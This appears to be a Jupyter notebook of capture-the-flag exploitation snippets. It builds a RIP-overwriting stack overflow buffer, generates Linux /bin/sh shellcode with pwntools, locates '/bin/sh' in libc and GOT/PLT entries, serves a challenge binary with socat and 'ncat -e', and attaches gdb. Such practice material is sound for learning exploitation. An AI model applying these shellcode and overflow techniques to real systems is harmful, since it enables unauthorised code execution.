{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using Python struct library"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#!/usr/bin/env python\n",
    "from struct import *\n",
    " \n",
    "buf = \"\"\n",
    "buf += \"A\"*104                      # offset to RIP\n",
    "buf += pack(\"<Q\", 0x424242424242)   # overwrite RIP with 0x0000424242424242\n",
    "buf += \"C\"*290                      # padding to keep payload length at 400 bytes\n",
    " \n",
    "f = open(\"in.txt\", \"w\")\n",
    "f.write(buf)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using Python pwn lib to create shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# shellcode for 64 bit\n",
    "context.arch='amd64'\n",
    "sc = shellcraft.amd64.linux.sh()\n",
    "sca = asm(sc)\n",
    "log.info(\"Using shellcode\\n\" + sc)\n",
    "log.info(hexdump(sca))\n",
    " \n",
    "# shellcode for 32 bit\n",
    "sc = shellcraft.linux.sh()\n",
    "sca = asm(sc)\n",
    "log.info(\"Using shellcode\\n\" + sc)\n",
    "log.info(hexdump(sca))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Run the challenge on localhost"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Using socat\n",
    "This solution will keep running the challenge on every connection.\n",
    "\n",
    "```\n",
    "$ socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./[PROGRAM_TO_RUN]\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Using ncat\n",
    "This solution only runs once.\n",
    "\n",
    "```\n",
    "# Install ncat\n",
    "$ sudo apt-get install nmap\n",
    "\n",
    "# Server terminal\n",
    "$ ncat -vlp 1234 -e [PROGRAM_TO_RUN]\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Client code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "conn = remote('localhost',1234)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using pwn lib to get GOT and PLT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "# Many settings in pwntools are controlled via the global variable :data:`.context, \n",
    "# such as the selected target operating system, architecture, and bit-width.\n",
    "\n",
    "# The recommended method is to use context.binary to automagically set all of the appropriate values.\n",
    "from pwn import *\n",
    "context.binary = './challenge-binary'\n",
    "elf = context.binary\n",
    "# -- OR --\n",
    "elf = ELF('./challenge-binary')\n",
    "\n",
    "elf.got[\"puts\"]\n",
    "elf.plt[\"read\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fork GDB process for debugging using pwn lib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Fork a gdb process (it opens up a new terminal) for debugging\n",
    "# TROUBLESHOOTING: I had problems attaching to the process and had to run the python code as sudo.\n",
    "\n",
    "from pwn import *\n",
    "\n",
    "conn = remote('localhost', 1234)\n",
    "\n",
    "# gdb.attach('[PROGRAM_NAME]', '''[GDB_COMMANDS]''')\n",
    "\n",
    "# Example\n",
    "gdb.attach('scv', '''\n",
    "break *0x400cce\n",
    "continue\n",
    "''')\n",
    "\n",
    "# Keep this line because if the program ends, so does your debug session\n",
    "conn.interactive() "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Do not keep endline characters when reading input in pwn lib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "conn = remote('localhost', 1234)\n",
    "conn.recvline(keepends=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using pwn lib to search for strings in binary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "elf = ELF('./libc-2.23.so')\n",
    "addr = next(elf.search('/bin/sh'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Getting symbols\n",
    "```\n",
    "# for shared libraries\n",
    "$ nm -D libNAME.so\n",
    "\n",
    "# for static libraries\n",
    "$ nm -g libNAME.a\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
